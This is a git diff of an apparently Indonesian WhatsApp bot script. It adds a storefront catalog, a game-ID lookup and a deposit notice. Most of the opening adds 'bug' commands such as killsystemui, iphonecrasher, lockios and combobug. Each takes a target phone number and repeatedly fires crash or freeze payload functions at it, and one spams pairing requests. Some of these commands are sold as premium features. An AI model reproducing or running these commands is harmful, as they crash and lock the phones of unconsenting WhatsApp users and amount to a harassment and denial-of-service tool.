+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Lock Target: ${zLoc}
+Requested Bug: 😈
+© Cella 
+ `)
+     for (let i = 0; i < 10; i++) {
+    await Gsz(zLoc, Ptcp = true)
+    await xPokers(zLoc, Ptcp = true)
+    await uidoc2(zLoc, ptcp = false)
+    await freezefile(zLoc, ptcp = false)
+    await CaroUsel(zLoc, ptcp = false)
+    await NullX(zLoc, ptcp = false)
+    await Vulcanicx(zLoc, ptcp = false)
+    await xTravas(zLoc, ptcp = false)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: 😈
+ `)
+ break
+case '🦅': 
+
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: 🦅
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await uidoc(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: 🦅
+ `)
+ case 'killsystemui':
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: Blank System Ui
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await uidoc(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+    await liveLokFreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Blank System Ui
+ `)
+ break
+ case 'blankwhatsapp': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: Blank System Ui
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await uidoc(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Blank System Ui
+ `)
+ break
+case 'mediumbug':
+ 
+if (!isPrem) return m.reply(` Khusus Premium Lol `)
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: mediumbug
+ `)
+     for (let i = 0; i < 5; i++) {
+    await SletterCrash(zLoc, ptcp = true)
+    await freezefile(zLoc, ptcp = true)
+    await liveLokFreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: mediumbug
+ `)
+ break
+case 'combobug':
+
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: Bug Combo 
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await IosPayM(zLoc, ptcp = true)
+    await IosStanza(zLoc, ptcp = true)
+    await IosCL(zLoc, ptcp = true)
+    await uidoc2(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+    await locasiV2(zLoc, ptcp = true)
+    await TanggapanDiterima(zLoc, ptcp = true)
+    await VPen(zLoc, ptcp = true)
+    await BlankInvite(zLoc, ptcp = true)
+    await liveLokFreeze(zLoc, ptcp = true)
+    await documentfreeze2(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Bug Combo
+ `)
+ break
+ case 'iphonecrasher': 
+ 
+ if (!isPrem) return m.reply(` Khusus Premium Lol `)
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: iPhone Bug
+ `)
+     for (let i = 0; i < 2; i++) {
+    await IosCL(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: iPhone Bug
+ `)
+ break
+ case 'lockios':
+ 
+if (!isPrem) return m.reply(` Khusus Premium Lol `)
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: iPhone Bug
+ `)
+     for (let i = 0; i < 2; i++) {
+    await IosCL(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: iPhone Bug
+ `)
+ break
+ case 'killaccess': 
+ 
+if (!isPrem) return m.reply(` Khusus Premium Lol `)
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: Kill iPhone Access
+ `)
+     for (let i = 0; i < 5; i++) {
+    await IosPayM(zLoc, ptcp = true)
+    await IosStanza(zLoc, ptcp = true)
+    await IosCL(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Kill iPhone Access
+ `)
+ break
+ case 'locationbug': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: Location Bug
+ `)
+     for (let i = 0; i < 9; i++) {
+    await liveLokFreeze(zLoc, ptcp = true)
+    await locasiV2(zLoc, ptcp = true)
+    await locasifreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Location Bug
+ `)
+ break
+ case 'documentbug': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: Document Bug
+ `)
+     for (let i = 0; i < 9; i++) {
+    await uidoc(zLoc, ptcp = true)
+    await documentfreeze2(zLoc, ptcp = true)
+    await documentfreeze(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: Document Bug
+ `)
+ break
+case 'pairing': 
+ 
+ 
+   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
+zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+m.reply(` Target: ${zLoc}
+Requested Bug: pairing
+ `)
+     for (let i = 0; i < 9; i++) {
+    await SendPairing(zLoc, ptcp = true)
+     }
+m.reply(` Successfully Sent Bugs To ${zLoc}
+Bug Type: pairing
+ `)
+ break
+ 
+
 
 			case '19rujxl1e': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     console.log('.')
 }
 break;
@@ -1226,7 +4317,7 @@ break;
 // Owner Menu
 case 'setbio': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) return sycreply('Mana text nya?');
     sych.setStatus(q);
     sycreply(`*Bio telah di ganti menjadi ${q}*`);
@@ -1235,7 +4326,7 @@ break;
 
 case "addcmd":
 case "setcmd": {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (isQuotedSticker) {
         if (!q) return sycreply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
         var kodenya = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
@@ -1254,7 +4345,7 @@ case "setcmd": {
 break;
 
 case "delcmd": {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isQuotedSticker) return sycreply(`Penggunaan : ${command} tagsticker`);
     var kodenya = m.message.extendedTextMessage.contextInfo.quotedMessage.fileSha256.toString("base64");
     _scommand.splice(getCommandPosition(kodenya), 1);
@@ -1270,7 +4361,7 @@ case "delcmd": {
 break;
 
 case "listcmd": {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
     cemde = [];
     for (let i of _scommand) {
@@ -1280,7 +4371,11 @@ case "listcmd": {
     sycreply(teksnyee, cemde, true);
 }
 break;
-
+case 'kee':{
+sycreply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT ADA KENDALA/DEPOSIT BELOM DI KONFIRMASI BISA CHAT OWNER DI BAWAH.')
+sych.sendMessage('50251731838@s.whatsapp.net', { text: `*ADA YANG DEPOSIT NIH*\n\n*@${sender.split('@')[0]}`, mentions: [sender]}, { quoted: fkontak })
+        }
+        break
 //guide
 case 'guide': {
     // Pesan guide singkat untuk pendaftaran
@@ -1288,6 +4383,4346 @@ case 'guide': {
 
     // Kirim pesan guide
     sycreply(guideText);
+}
+break;
+
+case 'mlstalk': {
+    if (!text) {
+        return sycreply(`Contoh penggunaan:\n${prefix + command} id|zona id\n\nEx.\n${prefix + command} 157228049|2241`);
+    }
+
+    async function mlstalk(id, zoneId) {
+        return new Promise((resolve, reject) => {
+            axios
+                .post(
+                    'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
+                    new URLSearchParams(
+                        Object.entries({
+                            productId: '1',
+                            itemId: '2',
+                            catalogId: '57',
+                            paymentId: '352',
+                            gameId: id,
+                            zoneId: zoneId,
+                            product_ref: 'REG',
+                            product_ref_denom: 'AE',
+                        })
+                    ),
+                    {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            Referer: 'https://www.duniagames.co.id/',
+                            Accept: 'application/json',
+                        },
+                    }
+                )
+                .then((response) => {
+                    resolve(response.data.data.gameDetail);
+                })
+                .catch((err) => {
+                    reject(err);
+                });
+        });
+    }
+
+    // Ambil data dari API
+    const [id, zoneId] = text.split('|');
+    const { userName } = await mlstalk(id, zoneId).catch(() => {
+        return sycreply("User tidak ditemukan");
+    });
+
+    const vf = `■ 「 *${n}MOBILE LEGENDS STALK${n}* 」\n
+${f}*Username* : *${n}${userName || "Kosong"}${n}*\n
+${f}*ID* : *${n}${id}${n}*\n
+${f}*ZonaId* : *${n}${zoneId}${n}*\n`;
+
+    const sections = [
+        {
+            title: "Silahkan Pilih Button di Bawah",
+            highlight_label: "Powered by Galangxyz",
+            rows: [
+                {
+                    title: "Product",
+                    description: "List All Product.",
+                    id: `${prefix}product`,
+                },
+                {
+                    title: "Top Up",
+                    description: "Intruksi Top up",
+                    id: `${prefix}topup`,
+                },
+            ],
+        },
+    ];
+
+    const listMessage = {
+        title: `Mau Topup? Disini!`,
+        sections,
+    };
+
+    const msg = generateWAMessageFromContent(
+        m.chat,
+        {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadata: {},
+                        deviceListMetadataVersion: 2,
+                    },
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        contextInfo: {
+                            mentionedJid: [m.sender],
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: "120363373320014871@newsletter",
+                                newsletterName: "Powered By Galangxyz",
+                                serverMessageId: -1,
+                            },
+                            businessMessageForwardInfo: {
+                                businessOwnerJid: sych.decodeJid(sych.user.id),
+                            },
+                        },
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: vf,
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: "Powered By Galangxyz",
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            title: "Topup Produk",
+                            subtitle: "Pilih opsi yang tersedia.",
+                            hasMediaAttachment: false,
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: [
+                                ...sections.map((section) => ({
+                                    name: "single_select",
+                                    buttonParamsJson: JSON.stringify(listMessage),
+                                })),
+                                {
+                                    name: "cta_copy",
+        buttonParamsJson: JSON.stringify({
+            display_text: "ID",
+            copy_code: `${id}`
+                                    }),
+                                },
+                                {
+                                    name: "cta_copy",
+        buttonParamsJson: JSON.stringify({
+            display_text: "Username",
+            copy_code: `${userName || "Kosong"}`
+                                    }),
+                                },
+                            ],
+                        }),
+                    }),
+                },
+            },
+        },
+        { quoted: fkontak }
+    );
+
+    // Kirim pesan
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id,
+    });
+
+    
+}
+break;
+
+//Feature
+case 'test': {
+    if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+                sycreply('Ok, Success!');
+                 // Simpan ID pesan terkirim untuk penghapusan otomatis
+    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+                break;
+            }
+
+            case 'totalfitur': {
+                if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+                const totalFitur = (fs.readFileSync('./naze.js').toString().match(new RegExp('break', 'g')) || []).length - 1;
+                
+              
+
+                sycreply(`Jumlah fitur saat ini: ${totalFitur}`);
+                   // Simpan ID pesan terkirim untuk penghapusan otomatis
+    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+                break;
+            }
+
+            case 'whoami': {
+                    if (!isCreator) return sycreply(mess.owner);
+                     return sycreply('Anda adalah pengguna bot.');
+
+                if (isOwner) {
+                    sycreply('Anda adalah owner bot.');
+                } else if (isMe) {
+                    sycreply('Anda adalah bot.');
+                } else {
+                    sycreply('Anda adalah bot sekaligus owner bot nya.');
+                }
+
+                break;
+            }
+            
+case 'owner_menu':
+            case 'menu_owner': {
+            const name = getUserName(m.sender);
+                if (global.lastMessageId) {
+        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
+    }
+                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');
+
+                const menu = `*\`Hai ${name}\`*
+
+- ${prefix}buy <code,target>
+- ${prefix}check_balance
+- ${prefix}wd_balance <nominal>
+`;
+
+                sycreply(menu);
+                 // Simpan ID pesan terkirim untuk penghapusan otomatis
+    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim
+
+                break;
+            }
+
+if (msg.product && msg.product.productImage) {
+    let productImage = msg.product.productImage;
+
+    console.log("✅ Gambar Produk Ditemukan!");
+    console.log("🔗 URL:", productImage.url);
+    console.log("📝 MIME Type:", productImage.mimetype);
+    console.log("📏 File Size:", productImage.fileLength);
+    console.log("🔑 Media Key:", productImage.mediaKey);
+    console.log("📸 Thumbnail:", productImage.jpegThumbnail);
+} else {
+    console.log("❌ Tidak ada gambar produk dalam pesan ini.");
+}
+
+
+case "menucatalog": {
+     
+
+    try {
+    
+    
+        let menu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome ke katalog kami!`;
+
+        // Membuat pesan katalog dengan gambar eksternal
+let msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2
+            },
+            productMessage: {
+                product: {
+                    productImage: {
+                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPO0xx8wj-yC22H5a8y77wnqiuDocaXKcWwrM7NdXp3qrCIlyfg8DOrl_rdyjmnsHd7DuxbflVI6sagEtFf-phCVDQymWsdDMT570nfxA?ccb=9-4&oh=01_Q5AaIJgQB7je7zNYpSKyrZereWgyMw4vd-lwYeo0U_0gAQhh&oe=67C79978&_nc_sid=e6ed6c&mms3=true",
+                        mimetype: "image/jpeg",
+                        fileSha256: "T3/s9mIeDZaVkg3TVeEDWwOPdEIcY5pOWbNTuU8LZLk=",
+                        fileEncSha256: "MUT7J+sx3ySh4a49wxlhqoxI1LbOGV6JrId49oCGvoc=",
+                        mediaKey: "Pg5gueOYm9s7ENS74rtF88IuBa1vcyVBcmznZm3PiNE=",
+                        fileLength: { low: 14892, high: 0, unsigned: true },
+                        height: 500,
+                        width: 500,
+                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k="
+                    },
+                    productId: "9103360316413843",
+                    currencyCode: "USD",
+                    priceAmount1000: { low: 1316133912, high: 2328, unsigned: false },
+                    title: "RKA STORE ©Powered by Langz",
+                    description: "RKA STORE\n\n" +
+    "Halo Welcome\n" +
+    "RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n" +
+    "RKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n" +
+    "Daftar kategori produk yang tersedia di bawah ini:\n\n" +
+    "╭─❍「 Game Populer 」❍\n" +
+    "│✧ MLBB\n" +
+    "│✧ ML_WDP\n" +
+    "│✧ ML_SL\n" +
+    "│✧ ML_TL\n" +
+    "│✧ Hok\n" +
+    "│✧ AOV\n" +
+    "│✧ LOL\n" +
+    "│✧ COC\n" +
+    "│✧ FF\n" +
+    "│✧ PUBG\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Data Internet 」❍\n" +
+    "│✧ BYU DATA\n" +
+    "│✧ TELKOMSEL DATA\n" +
+    "│✧ XL DATA\n" +
+    "│✧ AXIS DATA\n" +
+    "│✧ ISAT DATA\n" +
+    "│✧ TRI DATA\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Pulsa Reguler & Transfer 」❍\n" +
+    "│✧ BYU PULSA\n" +
+    "│✧ TELKOMSEL PULSA\n" +
+    "│✧ XL PULSA\n" +
+    "│✧ AXIS PULSA\n" +
+    "│✧ ISAT PULSA\n" +
+    "│✧ TRI PULSA\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Voucher 」❍\n" +
+    "│✧ PLN\n" +
+    "╰────❍",
+                    productImageCount: 1
+                },
+                businessOwnerJid: "17089003182@s.whatsapp.net",
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    }
+                    }
+            }
+        }
+    }
+}, { quoted: m });
+        // Simpan ID pesan terkirim untuk penghapusan otomatis jika diperlukan
+        
+
+        // Relay pesan katalog
+        await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
+        
+        console.log('Catalog berhasil dikirim!');
+    } catch (e) {
+        console.error('Error mengirim catalog:', e.message);
+        sycreply('Terjadi kesalahan saat mengirim katalog!');
+    }
+}
+break;
+
+case 't1': {
+    console.log("Mempersiapkan pesan template...");
+
+    let anu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, selamat datang di RKA STORE!`;
+    console.log("Pesan template: ", anu);
+
+    // Membuat template pesan
+    let template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+        viewOnceMessage: {
+            message: {
+                // Menambahkan contextInfo di sini
+                contextInfo: {
+                    mentionedJid: [m.sender], // Menyebut pengirim sebagai mention
+                    isForwarded: true, // Menandakan bahwa pesan ini diteruskan
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter', // ID newsletter
+                        newsletterName: 'Powered By Galangxyz', // Nama newsletter
+                        serverMessageId: -1 // ID pesan server
+                    }
+                },
+                templateMessage: {
+                    hydratedTemplate: {
+                        hydratedContentText: anu,
+                        hydratedFooterText: "RKA STORE ©Powered by Langz",
+                        hydratedButtons: [
+                            {
+                                urlButton: {
+                                    displayText: '🔗 Instagram',
+                                    url: 'https://instagram.com/iamkizakixd'
+                                }
+                            },
+                            {
+                                callButton: {
+                                    displayText: '📞 Owner Number',
+                                    phoneNumber: '+62 882-9202-4190'
+                                }
+                            },
+                            {
+                                quickReplyButton: {
+                                    displayText: '⚡ Speed',
+                                    id: 'ping'
+                                }
+                            },
+                            {
+                                quickReplyButton: {
+                                    displayText: '📜 Script',
+                                    id: 'sc'
+                                }
+                            },
+                            {
+                                quickReplyButton: {
+                                    displayText: '👑 Owner',
+                                    id: 'owner'
+                                }
+                            }
+                        ]
+                    }
+                }
+            }
+        }
+    }), { userJid: m.chat, quoted: m });
+
+    // Mengecek template yang telah dibuat
+    console.log("Template pesan yang dikirim: ", template.message);
+
+    console.log("Mengirim pesan...");
+    
+    // Mengirim pesan
+    try {
+        await sych.relayMessage(m.chat, template.message, { messageId: template.key.id });
+        console.log("Pesan berhasil dikirim!");
+    } catch (error) {
+        console.error("Error mengirim pesan: ", error);
+    }
+}
+break;
+
+
+console.log(msg.product.productImage);
+console.log("Product Image URL:", productImage.url);
+console.log("Product ID:", productId);
+console.log("Price:", priceAmount1000);
+console.log("Product Image:", JSON.stringify(msg.product.productImage, null, 2));
+
+case 'product':
+case 'list': {
+
+        let menu = `Halo ${m.pushName ? m.pushName : 'Tanpa Nama'}, Welcome ke katalog kami!`;
+
+        // Membuat pesan katalog dengan gambar eksternal
+let katalogMsg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2
+            },
+            productMessage: {
+                product: {
+                    productImage: {
+                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPO0xx8wj-yC22H5a8y77wnqiuDocaXKcWwrM7NdXp3qrCIlyfg8DOrl_rdyjmnsHd7DuxbflVI6sagEtFf-phCVDQymWsdDMT570nfxA?ccb=9-4&oh=01_Q5AaIJgQB7je7zNYpSKyrZereWgyMw4vd-lwYeo0U_0gAQhh&oe=67C79978&_nc_sid=e6ed6c&mms3=true",
+                        mimetype: "image/jpeg",
+                        fileSha256: "T3/s9mIeDZaVkg3TVeEDWwOPdEIcY5pOWbNTuU8LZLk=",
+                        fileEncSha256: "MUT7J+sx3ySh4a49wxlhqoxI1LbOGV6JrId49oCGvoc=",
+                        mediaKey: "Pg5gueOYm9s7ENS74rtF88IuBa1vcyVBcmznZm3PiNE=",
+                        fileLength: { low: 14892, high: 0, unsigned: true },
+                        height: 500,
+                        width: 500,
+                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAD8APwMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAgUGBAMBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA0glAAAEDkzEJ3XZe5HqTU+9VaSQqbqJkefYUV3w2kL9JiZAAAA//xAAmEAACAQMEAAYDAAAAAAAAAAABAgMABBEFEhMhECAjMUBRIkFC/9oACAEBAAE/APhXt6lpHn3apNUvZW6fbSX13auBI4eor62ljD8gpbmBjgSDxd0QZZgBWpXHPdnBytcUfXQqSL0c/wBZrTTwFuSPOaWGS5IzGI0odCpWZI2ZRkgUskJ/Obc7/WOhVzHE0skm3ANbIzjA/WfeuNAMA9GtKtvVklI8m1foVPbRToVdak0SUNmKSoNEIbM0lIixqFUYA+H/AP/EABgRAQADAQAAAAAAAAAAAAAAAAEAECAR/9oACAECAQE/AMhEvsXX/8QAGxEAAgMAAwAAAAAAAAAAAAAAAQIAESAQMkH/2gAIAQMBAT8AyqloQV5DUOsZgfK1/9k="
+                    },
+                    productId: "9103360316413843",
+                    currencyCode: "USD",
+                    priceAmount1000: { low: 1316133912, high: 2328, unsigned: false },
+                    title: "RKA STORE ©Powered by Langz",
+                    description: "RKA STORE\n\n" +
+    "Halo Welcome\n" +
+    "RKA STORE berkomitmen untuk memberikan pengalaman belanja yang mudah, nyaman, dan aman. Dengan layanan cepat serta responsif, kami siap membantu Anda kapan saja. \n\n" +
+    "RKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!\n\n" +
+    "Daftar kategori produk yang tersedia di bawah ini:\n\n" +
+    "╭─❍「 Game Populer 」❍\n" +
+    "│✧ MLBB\n" +
+    "│✧ ML_WDP\n" +
+    "│✧ ML_SL\n" +
+    "│✧ ML_TL\n" +
+    "│✧ Hok\n" +
+    "│✧ AOV\n" +
+    "│✧ LOL\n" +
+    "│✧ COC\n" +
+    "│✧ FF\n" +
+    "│✧ PUBG\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Data Internet 」❍\n" +
+    "│✧ BYU DATA\n" +
+    "│✧ TELKOMSEL DATA\n" +
+    "│✧ XL DATA\n" +
+    "│✧ AXIS DATA\n" +
+    "│✧ ISAT DATA\n" +
+    "│✧ TRI DATA\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Pulsa Reguler & Transfer 」❍\n" +
+    "│✧ BYU PULSA\n" +
+    "│✧ TELKOMSEL PULSA\n" +
+    "│✧ XL PULSA\n" +
+    "│✧ AXIS PULSA\n" +
+    "│✧ ISAT PULSA\n" +
+    "│✧ TRI PULSA\n" +
+    "╰────❍\n\n" +
+    "╭─❍「 Voucher 」❍\n" +
+    "│✧ PLN\n" +
+    "╰────❍",
+                    productImageCount: 1
+                },
+                businessOwnerJid: "17089003182@s.whatsapp.net",
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    }
+                    }
+            }
+        }
+    }
+}, { quoted: m });
+await sych.relayMessage(katalogMsg.key.remoteJid, katalogMsg.message, { messageId: katalogMsg.key.id });
+
+        let locationMsg = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    "newsletterAdminInviteMessage": {
+                        "newsletterJid": `120363396726721623@newsletter`,
+                        "newsletterName": "RKA STORE",
